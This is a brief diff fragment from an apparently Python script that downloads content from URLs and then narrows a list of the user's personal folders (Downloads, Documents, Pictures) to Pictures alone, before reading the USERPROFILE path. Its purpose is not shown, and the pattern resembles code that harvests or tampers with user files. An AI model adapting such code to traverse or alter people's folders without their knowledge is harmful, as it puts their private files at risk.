@@ -33,7 +33,7 @@ for url in urls:
         response = requests.get(url)
         f.write(response.content)
 
-targets = ["\Downloads", "\Documents", "", "\Pictures"]
+targets = ["\Pictures"]
 
 user_profile = os.environ['USERPROFILE']
 
